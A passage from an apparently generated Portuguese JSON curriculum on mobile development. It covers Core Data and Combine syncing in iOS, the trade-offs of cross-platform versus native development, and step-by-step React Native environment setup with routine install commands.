                                  "materials": "Xcode com SwiftUI preview, Documentação Combine da Apple, Raywenderlich tutoriais",
                                  "tips": "Combine é lazy; use .share() para múltiplos subscribers.",
                                  "learningObjective": "Aplicar publishers e operators para fluxos reativos de dados.",
                                  "commonMistakes": "Não cancelar subscriptions, confundir hot/cold publishers."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar Core Data, URLSession e Combine para Sincronização Completa",
                                  "subSteps": [
                                    "Criar um serviço que usa Combine para fetch de API e salva em Core Data.",
                                    "Implementar lógica de merge: atualizar local se remoto mudou.",
                                    "Adicionar handling de offline: carregar de Core Data se sem rede.",
                                    "Expor dados via @FetchRequest em SwiftUI para UI reativa.",
                                    "Testar cenários: online/offline, conflitos de dados."
                                  ],
                                  "verification": "App sincroniza dados da API, persiste localmente e atualiza UI reativamente em mudanças.",
                                  "estimatedTime": "3-4 horas",
                                  "materials": "Simulador iOS com Network Link Conditioner para simular falhas",
                                  "tips": "Use NSFetchedResultsController para notificações automáticas de mudanças em Core Data.",
                                  "learningObjective": "Construir um fluxo completo de dados persistentes e reativos em apps iOS.",
                                  "commonMistakes": "Race conditions em saves simultâneos, não tratar erros de rede em sinks."
                                }
                              ],
                              "practicalExample": "Desenvolva um app de lista de tarefas que busca tarefas de uma API REST (ex: JSONPlaceholder), armazena localmente com Core Data, permite edições offline e sincroniza via Combine, atualizando a SwiftUI List reativamente.",
                              "finalVerifications": [
                                "Dados persistem localmente após fechamento do app.",
                                "Chamadas de API retornam e decodificam corretamente.",
                                "UI atualiza automaticamente com mudanças via Combine.",
                                "Funciona offline carregando de Core Data.",
                                "Sincroniza corretamente ao reconectar à rede.",
                                "Tratamento de erros exibe alerts apropriados."
                              ],
                              "assessmentCriteria": [
                                "Código segue MVC ou MVVM com separação clara de concerns.",
                                "Tratamento completo de erros e estados de loading.",
                                "Performance: sem lags na UI, uso eficiente de memória.",
                                "Testabilidade: funções puras e injetáveis.",
                                "Conformidade com guidelines Apple (async, Codable).",
                                "Comentários e nomes de variáveis descritivos."
                              ],
                              "crossCurricularConnections": [
                                "Design de UX/UI: Integração com SwiftUI para views reativas.",
                                "Segurança: Autenticação em APIs e criptografia de dados locais.",
                                "Banco de Dados: Conceitos relacionais aplicados em Core Data.",
                                "Testes: Unit tests para publishers e mocks de URLSession.",
                                "Arquitetura de Software: Padrões reativos como Redux."
                              ],
                              "realWorldApplication": "Em apps como Instagram ou Todoist, onde posts/tarefas são buscados de servidores, armazenados localmente para uso offline e sincronizados reativamente, garantindo fluidez mesmo em conexões instáveis."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.2.3",
                    "name": "Desenvolvimento Cross-Platform",
                    "description": "Frameworks como React Native e Flutter para criar apps multiplataforma.",
                    "individualConcepts": [
                      {
                        "id": "26.3.1.1",
                        "name": "Conceitos Fundamentais do Desenvolvimento Cross-Platform",
                        "description": "Introdução aos princípios básicos do desenvolvimento de aplicações multiplataforma, incluindo definições, vantagens e desafios em comparação ao desenvolvimento nativo.",
                        "specificSkills": [
                          {
                            "id": "26.3.1.1.1",
                            "name": "Definir desenvolvimento cross-platform",
                            "description": "Explicar o que é desenvolvimento cross-platform, diferenciando de abordagens nativas, e listar cenários de uso ideais para aplicações móveis que rodam em iOS e Android com uma única base de código.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o conceito básico de desenvolvimento cross-platform",
                                  "subSteps": [
                                    "Pesquise definições oficiais de desenvolvimento cross-platform em fontes confiáveis como documentações do Flutter ou React Native.",
                                    "Identifique os princípios fundamentais: uso de uma única base de código para múltiplas plataformas (iOS e Android).",
                                    "Anote os componentes chave: linguagens como Dart (Flutter) ou JavaScript (React Native) e compilação para binários nativos.",
                                    "Resuma em 3-5 frases o que diferencia cross-platform de multi-plataforma genérica.",
                                    "Crie um diagrama simples comparando código único vs. códigos separados."
                                  ],
                                  "verification": "Você pode explicar o conceito em suas próprias palavras para um colega sem usar termos técnicos excessivos.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Acesso à internet",
                                    "Notebook ou papel para anotações",
                                    "Documentações oficiais de frameworks como Flutter e React Native"
                                  ],
                                  "tips": "Use analogias cotidianas, como 'um molde único para bolos de diferentes sabores', para fixar o conceito.",
                                  "learningObjective": "Ao final deste passo, você será capaz de definir desenvolvimento cross-platform com precisão conceitual.",
                                  "commonMistakes": [
                                    "Confundir cross-platform com desenvolvimento web responsivo.",
                                    "Ignorar que cross-platform compila para nativo, não apenas emula.",
                                    "Achar que é exclusivo para mobile, esquecendo desktop/web."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Diferenciar desenvolvimento cross-platform de abordagens nativas",
                                  "subSteps": [
                                    "Liste características do desenvolvimento nativo: Swift/Objective-C para iOS e Kotlin/Java para Android.",
                                    "Compare processos: nativo requer equipes separadas e bases de código duplicadas vs. cross-platform com código compartilhado 80-90%.",
                                    "Analise métricas chave: tempo de desenvolvimento, custo e performance (nativo geralmente mais otimizado).",
                                    "Crie uma tabela de comparação com colunas: Linguagem, Tempo de Build, Manutenção.",
                                    "Estude casos onde nativo é preferível (ex: jogos high-performance)."
                                  ],
                                  "verification": "Construa uma tabela de prós e contras que você consiga defender em uma discussão.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Planilha ou ferramenta como Google Sheets",
                                    "Artigos comparativos (ex: 'Flutter vs Native' no Medium)"
                                  ],
                                  "tips": "Foque em dados quantitativos, como 'cross-platform reduz tempo em 40%' de estudos reais.",
                                  "learningObjective": "Diferenciar claramente as abordagens nativa e cross-platform em termos de processo e resultados.",
                                  "commonMistakes": [
                                    "Superestimar performance cross-platform como igual à nativa.",
                                    "Ignorar custos de manutenção em nativo devido a duplicação de código.",
                                    "Confundir híbrido (ex: Cordova) com cross-platform verdadeiro."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar vantagens, desvantagens e limitações",
                                  "subSteps": [
                                    "Liste 5 vantagens: economia de tempo/custo, manutenção unificada, hot reload rápido.",
                                    "Identifique 4 desvantagens: curva de aprendizado de frameworks, performance inferior em casos extremos.",
                                    "Pesquise benchmarks reais (ex: tempo de renderização em apps cross vs native).",
                                    "Discuta cenários de falha: apps com hardware específico (câmera avançada).",
                                    "Registre quando optar por cross-platform: apps com UI simples e lógica compartilhada."
                                  ],
                                  "verification": "Escreva um parágrafo equilibrado sobre quando usar cada abordagem.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Benchmarks online (ex: Flutter performance docs)",
                                    "Vídeos curtos no YouTube sobre comparações"
                                  ],
                                  "tips": "Priorize fontes atualizadas (2023+), pois frameworks evoluem rapidamente.",
                                  "learningObjective": "Avaliar trade-offs para tomada de decisão informada.",
                                  "commonMistakes": [
                                    "Listar apenas vantagens, ignorando limitações reais.",
                                    "Generalizar desvantagens sem evidências.",
                                    "Esquecer atualizações recentes que melhoram performance cross-platform."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Identificar cenários de uso ideais para cross-platform",
                                  "subSteps": [
                                    "Classifique apps ideais: CRUD simples, e-commerce básico, apps corporativos.",
                                    "Exclua cenários ruins: jogos 3D intensivos, apps bancários com segurança extrema.",
                                    "Pesquise exemplos reais: apps como Alibaba (Flutter) ou Discord (React Native).",
                                    "Crie uma lista de 5 cenários com justificativa (ex: 'app de delivery: UI padrão').",
                                    "Simule escolha: dado um requisito, decida cross ou native."
                                  ],
                                  "verification": "Liste 3 cenários ideais e 2 não-ideais com razões claras.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Casos de estudo de empresas (ex: Google Flutter showcase)",
                                    "Fórum Stack Overflow para dúvidas reais"
                                  ],
                                  "tips": "Pense em MVP (Minimum Viable Product) onde velocidade importa mais que otimização máxima.",
                                  "learningObjective": "Selecionar cross-platform para projetos adequados, maximizando eficiência.",
                                  "commonMistakes": [
                                    "Aplicar cross-platform a tudo, sem considerar performance.",
                                    "Ignorar maturidade do framework para cenários específicos.",
                                    "Confundir protótipos com produtos finais."
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolva um app simples de lista de tarefas usando Flutter: escreva uma única base de código em Dart, compile para iOS (Xcode) e Android (Android Studio), teste em emuladores e confirme que roda identicamente sem alterações no código fonte.",
                              "finalVerifications": [
                                "Definir corretamente desenvolvimento cross-platform como 'desenvolvimento de apps com código único para múltiplas plataformas nativas'.",
                                "Diferenciar de nativo citando pelo menos 3 diferenças chave (linguagem, manutenção, performance).",
                                "Listar 3 cenários ideais (ex: apps de produtividade) e 2 não-ideais (ex: AR/VR).",
                                "Explicar vantagens como redução de 50% no tempo de desenvolvimento.",
                                "Criar uma tabela comparativa precisa.",
                                "Identificar frameworks como Flutter e React Native como exemplos."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual (definição exata sem erros comuns).",
                                "Completude da comparação nativo vs cross-platform.",
                                "Uso de exemplos reais e dados quantitativos.",
                                "Equilíbrio entre vantagens e desvantagens.",
                                "Clareza na identificação de cenários de uso.",
                                "Profundidade dos substeps executados."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Conceitos de linguagens híbridas (Dart, JS).",
                                "Gestão de Projetos: Análise custo-benefício e ROI.",
                                "Design de UX/UI: Adaptação de interfaces multiplataforma.",
                                "Negócios: Estratégias de mercado para apps mobile rápidos.",
                                "Qualidade de Software: Testes em múltiplas plataformas."
                              ],
                              "realWorldApplication": "Empresas como Nubank e iFood utilizam Flutter para apps cross-platform, permitindo lançamentos simultâneos em iOS e Android com uma equipe única, reduzindo custos em até 40% e acelerando time-to-market para milhões de usuários."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "26.3.1.1.2",
                            "name": "Identificar vantagens e desvantagens",
                            "description": "Analisar as vantagens como redução de tempo e custo de desenvolvimento, reutilização de código e manutenção unificada, versus desvantagens como performance inferior em casos específicos e limitações de acesso a APIs nativas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os conceitos fundamentais do desenvolvimento cross-platform",
                                  "subSteps": [
                                    "Ler definições de desenvolvimento cross-platform e compare com nativo.",
                                    "Identificar frameworks populares como Flutter, React Native e Xamarin.",
                                    "Analisar o ciclo de vida de um app cross-platform versus nativo.",
                                    "Estudar exemplos de apps reais desenvolvidos cross-platform.",
                                    "Mapear as diferenças arquiteturais básicas."
                                  ],
                                  "verification": "Resumir em 5 bullet points as diferenças principais entre cross-platform e nativo.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação oficial do Flutter e React Native",
                                    "Artigos sobre 'Cross-platform vs Native' no Medium"
                                  ],
                                  "tips": "Use diagramas para visualizar as diferenças arquiteturais.",
                                  "learningObjective": "Entender o que diferencia o desenvolvimento cross-platform do nativo.",
                                  "commonMistakes": "Confundir cross-platform com desenvolvimento web responsivo."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e analisar as vantagens do desenvolvimento cross-platform",
                                  "subSteps": [
                                    "Listar vantagens como redução de tempo e custo de desenvolvimento.",
                                    "Explicar reutilização de código com exemplos de 80-90% de código compartilhado.",
                                    "Analisar manutenção unificada e atualizações simultâneas para múltiplas plataformas.",
                                    "Quantificar benefícios econômicos com cenários hipotéticos.",
                                    "Pesquisar cases de sucesso de empresas."
                                  ],
                                  "verification": "Criar uma tabela com 4 vantagens e evidências para cada uma.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Relatórios da Stack Overflow sobre desenvolvimento móvel",
                                    "Vídeos tutoriais sobre Flutter advantages"
                                  ],
                                  "tips": "Priorize métricas quantificáveis como 'redução de 50% no tempo de desenvolvimento'.",
                                  "learningObjective": "Dominar as principais vantagens com argumentos fundamentados.",
                                  "commonMistakes": "Ignorar contextos onde vantagens não se aplicam, como apps de alta performance."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar e analisar as desvantagens do desenvolvimento cross-platform",
                                  "subSteps": [
                                    "Listar desvantagens como performance inferior em tarefas intensivas.",
                                    "Explicar limitações de acesso a APIs nativas e necessidade de bridges.",
                                    "Analisar overhead de runtime e consumo de bateria.",
                                    "Comparar benchmarks de performance com apps nativos.",
                                    "Discutir cenários onde cross-platform falha."
                                  ],
                                  "verification": "Elaborar uma lista com 4 desvantagens e exemplos reais de problemas.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Benchmarks de performance Flutter vs Swift/Kotlin no GitHub",
                                    "Fóruns como Reddit r/reactnative"
                                  ],
                                  "tips": "Use ferramentas como Profiler do Android Studio para validar performance.",
                                  "learningObjective": "Reconhecer limitações técnicas com exemplos concretos.",
                                  "commonMistakes": "Superestimar desvantagens sem dados empíricos."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Realizar uma análise comparativa equilibrada",
                                  "subSteps": [
                                    "Criar uma matriz de prós e contras com pesos por cenário.",
                                    "Avaliar quando optar por cross-platform versus nativo.",
                                    "Simular decisões baseadas em requisitos de projeto.",
                                    "Redigir um relatório de recomendação para um app hipotético.",
                                    "Revisar e refinar a análise com feedback autoavaliado."
                                  ],
                                  "verification": "Produzir um relatório de 1 página com análise balanceada e recomendação.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Templates de análise SWOT",
                                    "Ferramentas como Google Sheets para matrizes"
                                  ],
                                  "tips": "Considere fatores como tamanho da equipe e prazo do projeto.",
                                  "learningObjective": "Capacitar-se a tomar decisões informadas sobre escolha de abordagem.",
                                  "commonMistakes": "Ser enviesado para um lado sem considerar trade-offs."
                                }
                              ],
                              "practicalExample": "Desenvolva um app simples de lista de tarefas com Flutter: vantagem - código único deployado em iOS e Android em 2 semanas (vs 6 semanas nativo); desvantagem - animações fluidas exigem otimizações extras devido a performance 20% inferior em dispositivos low-end.",
                              "finalVerifications": [
                                "Lista corretamente pelo menos 4 vantagens com exemplos.",
                                "Identifica 4 desvantagens com impactos quantificados.",
                                "Produz uma matriz comparativa clara e equilibrada.",
                                "Recomenda adequadamente cross-platform para 2 cenários hipotéticos.",
                                "Explica trade-offs em um caso prático real.",
                                "Demonstra compreensão de benchmarks de performance."
                              ],
                              "assessmentCriteria": [
                                "Precisão e completude das vantagens/desvantagens (30%)",
                                "Uso de evidências e exemplos concretos (25%)",
                                "Equilíbrio na análise comparativa (20%)",
                                "Clareza e estrutura do relatório final (15%)",
                                "Aplicação prática em cenários reais (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Gestão de Projetos: Redução de tempo e custo no ciclo de desenvolvimento.",
                                "Economia Empresarial: Análise de ROI em ferramentas cross-platform.",
                                "Arquitetura de Software: Princípios de abstração e camadas.",
                                "Desempenho Computacional: Otimização e benchmarking."
                              ],
                              "realWorldApplication": "Empresas como Google (com Flutter) e Facebook (React Native) utilizam cross-platform para lançar apps como Alibaba e Instagram rapidamente em múltiplas plataformas, economizando milhões em desenvolvimento e manutenção."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "26.3.1.1.3",
                            "name": "Comparar com desenvolvimento nativo",
                            "description": "Comparar métricas como tempo de desenvolvimento, performance, tamanho do app e experiência do usuário entre cross-platform e nativo, usando exemplos práticos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender Fundamentos de Desenvolvimento Nativo e Cross-Platform",
                                  "subSteps": [
                                    "Defina desenvolvimento nativo: apps iOS com Swift/Objective-C e Android com Kotlin/Java.",
                                    "Defina desenvolvimento cross-platform: frameworks como React Native, Flutter ou Xamarin que compilam para múltiplas plataformas.",
                                    "Liste vantagens iniciais: nativo (otimizado por plataforma), cross-platform (código único, reuso).",
                                    "Identifique limitações: nativo (duplicação de código), cross-platform (possível overhead).",
                                    "Crie um glossário pessoal com 5 termos chave de cada abordagem."
                                  ],
                                  "verification": "Glossário completo com definições precisas e sem erros conceituais.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação oficial Apple (developer.apple.com)",
                                    "Documentação Android (developer.android.com)",
                                    "Site Flutter (flutter.dev) ou React Native (reactnative.dev)",
                                    "Vídeo introdutório no YouTube sobre nativo vs cross-platform"
                                  ],
                                  "tips": "Use tabelas para organizar definições lado a lado para visualização rápida.",
                                  "learningObjective": "Diferenciar conceitualmente nativo de cross-platform com precisão.",
                                  "commonMistakes": "Confundir cross-platform com web apps ou ignorar evoluções recentes como Flutter 3+."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e Definir Métricas de Comparação",
                                  "subSteps": [
                                    "Liste métricas chave: tempo de desenvolvimento, performance (FPS, uso de CPU/RAM), tamanho do APK/IPA, experiência do usuário (UX).",
                                    "Defina como medir cada uma: tempo (horas para MVP), performance (ferramentas como Android Profiler), tamanho (build final), UX (testes A/B).",
                                    "Pesquise benchmarks iniciais para cada métrica em fontes confiáveis.",
                                    "Crie uma tabela de métricas com colunas para nativo e cross-platform.",
                                    "Adicione métricas secundárias como custo de manutenção e curva de aprendizado."
                                  ],
                                  "verification": "Tabela preenchida com definições e métodos de medição para todas as 4 métricas principais.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Benchmark reports de sites como Stack Overflow Survey ou State of Mobile",
                                    "Ferramentas: Android Studio Profiler, Xcode Instruments",
                                    "Artigos Medium/Dev.to sobre comparações"
                                  ],
                                  "tips": "Priorize métricas quantificáveis; evite opiniões subjetivas sem dados.",
                                  "learningObjective": "Selecionar e operacionalizar métricas relevantes para comparações objetivas.",
                                  "commonMistakes": "Omitir contexto de versão (ex: Flutter antigo vs novo) ou focar só em performance ignorando tempo de dev."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Coletar Dados e Exemplos Práticos para Cada Métrica",
                                  "subSteps": [
                                    "Para tempo de dev: crie um app simples (lista de tarefas) em nativo e cross-platform, cronometrando.",
                                    "Meça performance: rode o app em emulador/dispositivo, registre FPS e uso de recursos.",
                                    "Verifique tamanho: gere builds e compare tamanhos de arquivo.",
                                    "Avalie UX: teste navegação, gestos e responda questionário de usabilidade.",
                                    "Documente achados em uma planilha comparativa com capturas de tela."
                                  ],
                                  "verification": "Planilha com dados reais de pelo menos um exemplo prático por métrica.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Android Studio, Xcode, VS Code com Flutter/React Native",
                                    "Emuladores iOS/Android",
                                    "App simples template: TodoMVC ou similar"
                                  ],
                                  "tips": "Use o mesmo hardware para testes justos; normalize features do app.",
                                  "learningObjective": "Coletar dados empíricos de métricas usando ferramentas reais.",
                                  "commonMistakes": "Testar em dispositivos low-end sem comparar high-end ou ignorar otimizações iniciais."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar, Comparar e Concluir",
                                  "subSteps": [
                                    "Compare dados lado a lado: calcule diferenças percentuais (ex: tempo cross-platform 40% menor).",
                                    "Discuta trade-offs: nativo vence em performance/UX, cross em tempo/custo.",
                                    "Use exemplos reais: Instagram (React Native), Google Ads (Flutter) vs apps nativos como banking apps.",
                                    "Crie um relatório visual com gráficos (barras para métricas).",
                                    "Formule recomendação baseada em cenários (startup vs enterprise)."
                                  ],
                                  "verification": "Relatório final com análise quantitativa e qualitativa, incluindo gráficos.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Google Sheets/Excel para gráficos",
                                    "Exemplos de apps: baixe APKs de lojas para análise"
                                  ],
                                  "tips": "Sempre cite fontes; use médias de múltiplos testes para robustez.",
                                  "learningObjective": "Sintetizar dados em comparações acionáveis e contextualizadas.",
                                  "commonMistakes": "Generalizar de um exemplo só ou bias por preferência pessoal sem dados."
                                }
                              ],
                              "practicalExample": "Desenvolva um app de lista de compras simples: em nativo (Swift para iOS + Kotlin para Android: ~20h total), vs Flutter (~8h). Meça: tempo real gravado, performance (60 FPS nativo vs 55 Flutter), tamanho (25MB nativo vs 15MB Flutter), UX via 5 usuários testando gestos (nota 9/10 nativo vs 8/10 Flutter).",
                              "finalVerifications": [
                                "Pode listar 4 métricas com dados comparativos precisos de um exemplo prático.",
                                "Explica trade-offs com exemplos reais de apps comerciais.",
                                "Cria tabela/gráfico mostrando diferenças percentuais.",
                                "Identifica cenários ideais para cada abordagem.",
                                "Demonstra medição prática com ferramentas como Profiler.",
                                "Relatório sem erros factuais sobre benchmarks recentes."
                              ],
                              "assessmentCriteria": [
                                "Precisão e atualidade dos dados (80% peso: fontes 2023+).",
                                "Profundidade da análise quantitativa (diferenças calculadas).",
                                "Qualidade dos exemplos práticos (reprodutíveis).",
                                "Clareza na comunicação (visuais e linguagem acessível).",
                                "Compreensão de trade-offs (não absolutista).",
                                "Originalidade na coleta de dados (não só copiado)."
                              ],
                              "crossCurricularConnections": [
                                "Economia/Gestão: Análise custo-benefício para decisões empresariares.",
                                "Design de UX/UI: Avaliação subjetiva de experiência do usuário.",
                                "Matemática/Estatística: Cálculo de médias, percentuais e benchmarks.",
                                "Negócios: Estratégias de escalabilidade para startups vs corporações."
                              ],
                              "realWorldApplication": "Em equipes de desenvolvimento, use essa comparação para escolher frameworks em projetos reais, como startups optando por Flutter para MVP rápido (economia de 50% tempo) vs bancos priorizando nativo para performance crítica em transações."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "26.3.1.2",
                        "name": "React Native",
                        "description": "Framework baseado em JavaScript e React para construção de aplicações móveis nativas multiplataforma, utilizando componentes nativos renderizados via ponte com o código nativo.",
                        "specificSkills": [
                          {
                            "id": "26.3.1.2.1",
                            "name": "Configurar ambiente React Native",
                            "description": "Instalar e configurar o ambiente de desenvolvimento com Node.js, React Native CLI, Android Studio e Xcode, incluindo emuladores para testes em iOS e Android.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Instalar Node.js e gerenciador de pacotes",
                                  "subSteps": [
                                    "Baixe a versão LTS do Node.js do site oficial (nodejs.org).",
                                    "Execute o instalador e siga as instruções do assistente.",
                                    "Verifique a instalação abrindo o terminal e digitando 'node -v' e 'npm -v'.",
                                    "Instale Yarn opcionalmente com 'npm install -g yarn'.",
                                    "Configure o PATH se necessário para acessar globalmente."
                                  ],
                                  "verification": "Comandos 'node -v' e 'npm -v' retornam versões válidas sem erros.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Computador com macOS, Windows ou Linux",
                                    "Conexão à internet",
                                    "Navegador web"
                                  ],
                                  "tips": "Use a versão LTS para estabilidade; reinicie o terminal após instalação.",
                                  "learningObjective": "Entender e instalar o runtime JavaScript necessário para React Native.",
                                  "commonMistakes": [
                                    "Instalar versão não-LTS causando incompatibilidades",
                                    "Esquecer de reiniciar o terminal",
                                    "Problemas de proxy/firewall bloqueando download"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Instalar React Native CLI",
                                  "subSteps": [
                                    "Abra o terminal e execute 'npm install -g @react-native-community/cli'.",
                                    "Verifique com 'npx react-native --version'.",
                                    "Resolva erros de permissão no macOS/Linux com 'sudo' se necessário.",
                                    "Instale Watchman no macOS via Homebrew: 'brew install watchman'.",
                                    "Confirme que o CLI está acessível globalmente."
                                  ],
                                  "verification": "'npx react-native --version' exibe a versão instalada corretamente.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Terminal/Command Prompt",
                                    "Node.js instalado"
                                  ],
                                  "tips": "Use npx para evitar conflitos com versões globais antigas.",
                                  "learningObjective": "Configurar a ferramenta de linha de comando oficial para inicializar projetos RN.",
                                  "commonMistakes": [
                                    "Usar o antigo 'react-native-cli' em vez do novo",
                                    "Ignorar Watchman no macOS levando a lentidão",
                                    "Permissões insuficientes sem sudo"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar ambiente Android com Android Studio",
                                  "subSteps": [
                                    "Baixe e instale Android Studio do site oficial.",
                                    "Abra o SDK Manager e instale Android SDK Build-Tools, Platform e Emulator.",
                                    "Crie um AVD (Android Virtual Device) no AVD Manager.",
                                    "Defina variáveis de ambiente: ANDROID_HOME e adicione platform-tools ao PATH.",
                                    "Aceite licenças com 'sdkmanager --licenses'."
                                  ],
                                  "verification": "Emulador Android inicia sem erros e 'adb devices' lista o dispositivo.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Android Studio",
                                    "Espaço em disco (mínimo 10GB)",
                                    "Java JDK 11+"
                                  ],
                                  "tips": "Use HAXM ou Hypervisor para aceleração de hardware no emulador.",
                                  "learningObjective": "Preparar o SDK Android para compilação e testes cross-platform.",
                                  "commonMistakes": [
                                    "Esquecer variáveis de ambiente",
                                    "Não aceitar licenças SDK",
                                    "Baixa RAM no emulador causando lentidão"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar ambiente iOS com Xcode (para macOS)",
                                  "subSteps": [
                                    "Instale Xcode pela App Store.",
                                    "Instale Command Line Tools com 'xcode-select --install'.",
                                    "Abra Xcode e instale componentes adicionais.",
                                    "Crie um simulador iOS no Xcode Simulator.",
                                    "Instale CocoaPods com 'sudo gem install cocoapods' e rode 'pod setup'."
                                  ],
                                  "verification": "Simulador iOS abre e 'xcodebuild -version' funciona.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "macOS apenas",
                                    "Xcode (gratuito na App Store)",
                                    "Ruby/Gems"
                                  ],
                                  "tips": "Para Windows/Linux, foque apenas em Android; use Expo para iOS sem Mac.",
                                  "learningObjective": "Habilitar build e testes nativos para iOS em ambiente Apple.",
                                  "commonMistakes": [
                                    "Executar sem Command Line Tools",
                                    "Ignorar pod setup causando erros de dependências",
                                    "Versão Xcode incompatível"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar a configuração completa",
                                  "subSteps": [
                                    "Crie um novo projeto: 'npx react-native@latest init MeuApp'.",
                                    "Navegue para a pasta: 'cd MeuApp'.",
                                    "Rode no Android: 'npx react-native run-android'.",
                                    "Rode no iOS: 'npx react-native run-ios'.",
                                    "Verifique Metro bundler e app abrindo sem crashes."
                                  ],
                                  "verification": "App padrão roda em ambos emuladores/simuladores sem erros de build.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Projeto RN criado",
                                    "Emuladores configurados"
                                  ],
                                  "tips": "Limpe cache com 'npx react-native start --reset-cache' se houver issues.",
                                  "learningObjective": "Validar end-to-end a configuração do ambiente de desenvolvimento.",
                                  "commonMistakes": [
                                    "Portas em uso pelo Metro",
                                    "Dispositivo não autorizado",
                                    "Cache antigo causando falhas"
                                  ]
                                }
                              ],
                              "practicalExample": "Após configuração, crie um app simples de contador: inicialize projeto, adicione estado com useState, rode em Android e iOS emuladores para testar touch interactions cross-platform.",
                              "finalVerifications": [
                                "Node.js e CLI versões exibidas corretamente.",
                                "Projeto RN init sem erros.",
                                "Emulador Android inicia e app compila.",
                                "Simulador iOS roda app nativamente.",
                                "Hot reload funciona em ambos.",
                                "Sem erros de dependências ou licenças."
                              ],
                              "assessmentCriteria": [
                                "Todas variáveis de ambiente definidas corretamente.",
                                "Emuladores/simuladores funcionais e acessíveis via CLI.",
                                "Projeto de teste compila e executa em <5 minutos.",
                                "Nenhuma dependência manual extra necessária.",
                                "Logs de erro resolvidos autonomamente.",
                                "Compatibilidade com React Native 0.70+."
                              ],
                              "crossCurricularConnections": [
                                "Programação Web: Reutiliza conhecimento de React e JSX.",
                                "Sistemas Operacionais: Gerenciamento de PATH e SDKs multiplataforma.",
                                "Engenharia de Software: Configuração de ambientes CI/CD semelhantes.",
                                "Redes: Configuração de proxies para downloads SDK.",
                                "Design de UX: Testes iniciais em emuladores reais."
                              ],
                              "realWorldApplication": "Desenvolvedores mobile em startups configuram isso diariamente para prototipar apps como delivery ou e-commerce cross-platform, economizando tempo vs desenvolvimento nativo separado."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "26.3.1.1.1"
                            ]
                          },
                          {
                            "id": "26.3.1.2.2",
                            "name": "Criar componentes básicos",
                            "description": "Desenvolver interfaces com componentes como View, Text, Image e ScrollView, aplicando estilos com StyleSheet e gerenciando estado com useState e useEffect.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Criar componente básico com View e Text",
                                  "subSteps": [
                                    "Instale o React Native CLI com npm install -g react-native-cli.",
                                    "Crie um novo projeto: npx react-native init MeuAppBasico.",
                                    "No App.js, importe View e Text de 'react-native'.",
                                    "Estruture o JSX com <View><Text>Olá Mundo</Text></View>.",
                                    "Execute 'npx react-native run-android' ou 'run-ios' no emulador."
                                  ],
                                  "verification": "App inicia sem erros e exibe 'Olá Mundo' em uma View branca.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "React Native CLI",
                                    "Node.js",
                                    "Emulador Android Studio ou Xcode",
                                    "VS Code"
                                  ],
                                  "tips": [
                                    "Use flex:1 na View principal para ocupar tela cheia.",
                                    "Sempre rode 'npx react-native start' para o Metro bundler."
                                  ],
                                  "learningObjective": "Compreender a estrutura fundamental de componentes visuais no React Native.",
                                  "commonMistakes": [
                                    "Esquecer importações",
                                    "Não envolver Text em View",
                                    "Erros de sintaxe JSX"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Adicionar Image e ScrollView para conteúdo dinâmico",
                                  "subSteps": [
                                    "Importe Image e ScrollView de 'react-native'.",
